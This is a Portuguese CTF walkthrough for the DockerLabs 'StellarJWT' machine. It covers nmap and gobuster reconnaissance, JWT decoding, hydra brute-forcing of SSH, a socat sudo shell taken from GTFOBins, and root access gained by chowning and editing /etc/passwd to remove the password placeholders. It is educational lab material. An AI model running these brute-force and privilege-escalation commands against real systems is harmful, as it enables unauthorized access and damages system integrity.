<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.stellarjwt</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.stellarjwt</h1><br/><p></p><p><strong><span style="color:#ff0000;">MAÁQUINA STELLARJWT</span></strong></p><p></p><p><img src="images/155-1.png" alt="images/155-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/155-2.png" alt="images/155-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">nmap 172.17.0.3 -A -sS -sV -sC -Pn -T5 </span></strong><strong></strong></p><p><strong>                </strong></p><p><img src="images/155-3.png" alt="images/155-3.png" /></p><p></p><p><strong>Temos as porta 22 e 80 aberta</strong>.</p><p></p><p><strong><span style="color:#ff7800;">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))</span></strong></p><p></p><p><strong>Vamos explorar a porta 80 no navegador </strong><strong><a href="http://172.17.0.3/">http://172.17.0.3/</a></strong></p><p></p><p><img src="images/155-4.png" alt="images/155-4.png" /></p><p></p><p><strong><span style="color:#ff0000;">Exemplo 1</span></strong><strong>: para descobrir o usuário e senha</strong></p><p></p><p><strong><span style="color:#ff7800;">¿Qué astrónomo alemán descubrió Neptuno?</span></strong><strong></strong></p><p><strong></strong><strong><span style="color:#9141ac;">Qual astrônomo alemão descobriu Netuno?</span></strong><strong> TRADUÇÃO PORTUGUES.</strong><strong></strong></p><p><strong>A resposta é </strong><strong><span style="color:#ff7800;">Johann Gottlieb Galle</span></strong>.</p><p></p><p><img src="images/155-5.png" alt="images/155-5.png" /></p><p></p><p><img src="images/155-6.png" alt="images/155-6.png" /></p><p></p><p><strong>Vamos usar o </strong><strong><span style="color:#ff7800;">nano</span></strong><strong> para criar uma lista de palavras com possiveis usuários e senhas.</strong><strong></strong></p><p><strong></strong></p><p><img src="images/155-7.png" alt="images/155-7.png" /></p><p></p><p><strong>Agora vamos fazer um ataque de força-bruta com </strong><strong><span style="color:#ff7800;">hydra</span></strong><strong> usuando a lista de palavras criada </strong><strong><span style="color:#ff7800;">senhas1.txt</span></strong>.</p><p></p><p><strong>E encontramos usuário e senha.</strong><strong></strong></p><p><strong>usuário: </strong><strong><span style="color:#ff7800;">neptuno</span></strong><strong></strong></p><p><strong>senha:</strong> <strong><span style="color:#ff7800;">Gottfried</span></strong></p><p></p><p><img src="images/155-8.png" alt="images/155-8.png" /></p><p></p><p><strong><span style="color:#ff0000;">Exemplo 2</span></strong><strong>: para descobrir o usuário e senha</strong></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">gobuster dir -u </span></strong><strong><a href="http://172.17.0.3">http://172.17.0.3</a></strong><strong><span style="color:#ff7800;"> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .txt,.php,.html,.py</span></strong></p><p></p><p><img src="images/155-9.png" alt="images/155-9.png" /></p><p></p><p><strong>Vamos entrar no diretório encontrado com gobuster </strong><strong><span style="color:#ff7800;">/universe</span></strong> <strong><a href="http://172.17.0.3/universe/">http://172.17.0.3/universe/</a></strong>.</p><p></p><p><img src="images/155-10.png" alt="images/155-10.png" /></p><p></p><p><strong>Código fonte Ctrl +U view-source:</strong><strong><a href="http://172.17.0.3/universe/">http://172.17.0.3/universe/</a></strong><strong>, encontramos algo interessante.</strong></p><p>( <strong><span style="color:#c061cb;">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9.t-UG_wEbJdc_t0spVGKkNaoVaOeNnQwzvQOfq0G3PcE</span></strong><span style="color:#c061cb;"> </span>)</p><p></p><p><img src="images/155-11.png" alt="images/155-11.png" /></p><p></p><p><strong>Vamos para o site:</strong><strong><a href="https://jwt.io/">https://jwt.io/</a></strong><strong> pra ver o que tem nesse comentário acima.</strong></p><p></p><p><strong>Achamos o usuário </strong><strong><span style="color:#ff7800;">neptuno</span></strong></p><p></p><p><img src="images/155-12.png" alt="images/155-12.png" /></p><p></p><p><strong>Agora vamos fazer um ataque de força-bruta com </strong><strong><span style="color:#ff7800;">hydra</span></strong><strong> no usuário </strong><strong><span style="color:#ff7800;">neptuno</span></strong><strong> usando a lista de palavras </strong><strong><span style="color:#ff7800;">senhas1.txt</span></strong><strong> criada anterior através da pergunta e a resposta que esta na imagem abaixo. </strong></p><p></p><p><img src="images/155-13.png" alt="images/155-13.png" /></p><p></p><p><strong>E veja que conseguimos a senha de usuário com sucesso.</strong></p><p><strong>usuário: </strong><strong><span style="color:#ff7800;">neptuno</span></strong><strong></strong></p><p><strong>senha: </strong><strong><span style="color:#ff7800;">Gottfried</span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><img src="images/155-14.png" alt="images/155-14.png" /></p><p></p><p>Vamos nos conectar no ssh.</p><p></p><p><span style="color:#ff7800;">ssh neptuno@172.17.0.3</span></p><p></p><p><img src="images/155-15.png" alt="images/155-15.png" /></p><p></p><p><span style="color:#ff0000;">Exploração </span>:</p><p></p><p>Encontramos um arquivo txt:<span style="color:#ff7800;"> .carta_a_la_NASA.txt</span></p><p></p><p><img src="images/155-16.png" alt="images/155-16.png" /></p><p></p><p><span style="color:#ff0000;">Tradução</span> <span style="color:#ff0000;">da carta para portugues</span>.</p><p></p><p>&quot;Bom dia, quero entrar na NASA. Já respondi às perguntas que me fizeram. Aqui estão as respostas novamente.</p><p>O que significam as siglas NASA? -&gt; National Aeronautics and Space Administration</p><p>Em que ano a NASA foi fundada? -&gt; 1958</p><p>Quem fundou a NASA? -&gt; Eisenhower</p><p>Por favor, preciso entrar!!&quot;</p><p></p><p>**************************************************************</p><p></p><p><strong>Sabemos que Nasa é um usuário, então vamos tentar a senha como o nome Eisenhower. </strong></p><p><strong>usuário: </strong><strong><span style="color:#ff7800;">nasa</span></strong><strong></strong></p><p><strong>senha: </strong><strong><span style="color:#ff7800;">Eisenhower</span></strong></p><p><strong>Veja abaixo conseguimos entrar no usuário </strong><strong><span style="color:#ff7800;">nasa</span></strong>.</p><p></p><p><img src="images/155-17.png" alt="images/155-17.png" /></p><p></p><p><strong>Vamos buscar por privilégios com </strong><strong><span style="color:#ff7800;">sudo -l</span></strong> .</p><p></p><p><strong>Com a informação que você obteve, o usuário </strong><strong><code>nasa</code></strong><strong> pode executar o comando </strong><strong><code>/usr/bin/socat</code></strong><strong> como o usuário </strong><strong><code>elite</code></strong><strong> sem a necessidade de senha</strong>.</p><p></p><p><img src="images/155-18.png" alt="images/155-18.png" /></p><p></p><p></p><p><strong>Vamos para o site: </strong><strong><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></strong><strong> </strong> <strong>e pesquisar por </strong><strong><span style="color:#ff7800;">socat </span></strong>.</p><p></p><p><img src="images/155-19.png" alt="images/155-19.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -u elite /usr/bin/socat stdin exec:/bin/sh</span></strong></p><p></p><p><img src="images/155-20.png" alt="images/155-20.png" /></p><p></p><p> <strong>O usuário </strong><strong><code>elite</code></strong><strong> pode executar o comando </strong><strong><code>/usr/bin/chown</code></strong><strong> como root sem a necessidade de senha (</strong><strong><code>NOPASSWD</code></strong><strong>). Isso é uma boa oportunidade para escalar privilégios. Vamos usar essa informação para obter acesso root.</strong></p><p> </p><p><img src="images/155-21.png" alt="images/155-21.png" /></p><p></p><p><strong>Vamos para o site: </strong><strong><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></strong><strong> </strong> <strong>e pesquisar por chown</strong><strong><span style="color:#ff7800;"> </span></strong>.</p><p></p><p><img src="images/155-22.png" alt="images/155-22.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo -u elite /usr/bin/socat stdin exec:/bin/sh</span></strong></p><p><strong>Depois desse comando entramos no usuário </strong><strong><span style="color:#ff7800;">elite</span></strong>.</p><p></p><p><img src="images/155-23.png" alt="images/155-23.png" /></p><p></p><p><img src="images/155-24.png" alt="images/155-24.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo chown elite:elite /etc/passwd</span></strong></p><p></p><p><img src="images/155-25.png" alt="images/155-25.png" /></p><p></p><p><img src="images/155-26.png" alt="images/155-26.png" /></p><p></p><p><strong><span style="color:#ff7800;">sudo chown elite:elite /etc</span></strong></p><p></p><p><img src="images/155-27.png" alt="images/155-27.png" /></p><p></p><p><img src="images/155-28.png" alt="images/155-28.png" /></p><p></p><p>************************************************************************************</p><p><strong><span style="color:#ff7800;">ls -l  /</span></strong></p><p></p><p><img src="images/155-29.png" alt="images/155-29.png" /></p><p></p><p>************************************************************************************</p><p><strong><span style="color:#ff7800;">sed &#39;s/x//g&#39; /etc/passwd</span></strong></p><p></p><p><img src="images/155-30.png" alt="images/155-30.png" /></p><p></p><p><img src="images/155-31.png" alt="images/155-31.png" /></p><p></p><p>************************************************************************************</p><p><strong><span style="color:#ff7800;">sed -i &#39;s/x//g&#39; /etc/passwd</span></strong></p><p></p><p><img src="images/155-32.png" alt="images/155-32.png" /></p><p></p><p><img src="images/155-33.png" alt="images/155-33.png" /></p><p></p><p>************************************************************************************</p><p><strong><span style="color:#ff7800;">cat /etc/passwd</span></strong></p><p></p><p><img src="images/155-34.png" alt="images/155-34.png" /></p><p></p><p><img src="images/155-35.png" alt="images/155-35.png" /></p><p></p><p>************************************************************************************</p><p><strong><span style="color:#ff7800;">su root </span></strong></p><p></p><p><img src="images/155-36.png" alt="images/155-36.png" /></p><p></p><p><strong><span style="color:#ff7800;">somos root</span></strong></p><p></p><p><strong><span style="color:#ff0000;">bobmarley</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
